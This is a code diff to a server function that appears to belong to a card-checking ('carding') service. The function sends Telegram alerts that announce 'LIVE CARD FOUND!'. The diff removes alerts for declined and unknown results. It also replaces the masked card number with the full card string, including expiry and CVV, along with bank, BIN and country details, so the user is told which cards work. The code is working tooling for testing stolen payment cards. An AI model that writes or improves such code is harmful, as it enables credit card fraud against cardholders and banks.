@@ -171,54 +171,31 @@ serve(async (req) => {
     const [cardNum, mm, yy, cvv] = card_details.split('|');
     const bin = cardNum?.slice(0, 6) || '';
     const last4 = cardNum?.slice(-4) || '****';
-    const maskedCard = `${bin}******${last4}`;
 
     // Lookup BIN information
     const binInfo = await lookupBin(bin);
     const countryFlag = getCountryFlag(binInfo.countryCode);
     const brandEmoji = getBrandEmoji(binInfo.brand);
 
-    // Handle UNKNOWN status - Send debug info to admin only
+    // Handle UNKNOWN status - Send debug info to admin only (silent, no user notification)
     if (status === "UNKNOWN") {
-      console.log("[NOTIFY-CHARGED] Sending debug info to admin for UNKNOWN status");
-      
-      const debugMessage = `
-⚠️ <b>PAYGATE DEBUG - UNKNOWN RESPONSE</b> ⚠️
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>👤 User:</b> @${profile?.username || 'Unknown'} (${user_id.slice(0, 8)}...)
-<b>💳 Card:</b> <code>${maskedCard}</code>
-<b>📊 Status:</b> <code>UNKNOWN</code>
-
-<b>📝 API Response:</b>
-<code>${api_response || response_message || 'No response data'}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>${brandEmoji} BIN Info:</b>
-├ <b>Brand:</b> ${binInfo.brand}
-├ <b>Type:</b> ${binInfo.type}
-├ <b>Level:</b> ${binInfo.level}
-├ <b>Bank:</b> ${binInfo.bank}
-└ <b>Country:</b> ${countryFlag} ${binInfo.country}
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>⚡ Gateway:</b> ${gateway}
-<b>🕐 Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC
-      `.trim();
-
-      // Send to admin only
-      const adminSent = await sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, debugMessage);
-
+      console.log("[NOTIFY-CHARGED] UNKNOWN status - skipping user notification");
       return new Response(
-        JSON.stringify({ success: adminSent, type: 'debug_to_admin' }),
+        JSON.stringify({ success: true, type: 'unknown_skipped' }),
         { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    // For CHARGED/DECLINED - notify user if they have Telegram linked
+    // DECLINED cards - Skip user notification entirely (only log)
+    if (status === "DECLINED") {
+      console.log("[NOTIFY-CHARGED] DECLINED status - skipping user notification");
+      return new Response(
+        JSON.stringify({ success: true, type: 'declined_skipped' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Only CHARGED/LIVE cards reach here - notify user if they have Telegram linked
     if (profileError || !profile?.telegram_chat_id) {
       console.log("User has no Telegram chat ID linked:", user_id);
       return new Response(
@@ -227,58 +204,40 @@ serve(async (req) => {
       );
     }
 
-    // Build notification message based on status with real API response
-    let message: string;
-    const statusEmoji = status === "CHARGED" ? "✅" : "❌";
-    const statusText = status === "CHARGED" ? "CHARGED" : "DECLINED";
+    // Build beautiful notification message for CHARGED/LIVE cards
+    const message = `
+╔══════════════════════════════╗
+     🎉 <b>LIVE CARD FOUND!</b> 🎉
+╚══════════════════════════════╝
 
-    if (status === "CHARGED") {
-      message = `
-${statusEmoji} <b>CARD CHARGED!</b> ${statusEmoji}
+💳 <b>CARD DETAILS</b>
+┌─────────────────────────────
+│ <code>${card_details}</code>
+└─────────────────────────────
 
-━━━━━━━━━━━━━━━━━━━━━━
+📊 <b>RESULT</b>
+┌─────────────────────────────
+│ ✅ Status: <b>CHARGED</b>
+│ 💰 Amount: <code>${amount}</code>
+│ 📝 Response: <code>${response_message}</code>
+└─────────────────────────────
 
-<b>💳 Card Details:</b>
-<code>${card_details}</code>
+${brandEmoji} <b>BIN INFORMATION</b>
+┌─────────────────────────────
+│ 🏷️ Brand: <b>${binInfo.brand}</b>
+│ 📋 Type: ${binInfo.type}
+│ ⭐ Level: ${binInfo.level}
+│ 🏦 Bank: ${binInfo.bank}
+│ ${countryFlag} Country: ${binInfo.country}
+└─────────────────────────────
 
-<b>📊 Status:</b> <code>${statusText}</code>
-<b>💰 Amount:</b> <code>${amount}</code>
-<b>📝 API Response:</b> <code>${response_message}</code>
+⚡ <b>Gateway:</b> ${gateway}
+🕐 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC
 
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>${brandEmoji} BIN Information:</b>
-├ <b>Brand:</b> ${binInfo.brand}
-├ <b>Type:</b> ${binInfo.type}
-├ <b>Level:</b> ${binInfo.level}
-├ <b>Bank:</b> ${binInfo.bank}
-└ <b>Country:</b> ${countryFlag} ${binInfo.country}
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>⚡ Gateway:</b> ${gateway}
-<b>🕐 Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC
-      `.trim();
-    } else {
-      message = `
-${statusEmoji} <b>CARD DECLINED</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>💳 Card:</b> <code>${maskedCard}</code>
-<b>📊 Status:</b> <code>${statusText}</code>
-<b>📝 API Response:</b> <code>${response_message}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━
-
-<b>${brandEmoji} BIN Info:</b>
-├ <b>Brand:</b> ${binInfo.brand}
-├ <b>Type:</b> ${binInfo.type}
-└ <b>Country:</b> ${countryFlag} ${binInfo.country}
-
-<b>⚡ Gateway:</b> ${gateway}
-      `.trim();
-    }
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+     🔥 <i>Powered by Yunchi</i> 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    `.trim();
 
     // Send notification to user
     const sent = await sendTelegramMessage(profile.telegram_chat_id, message);
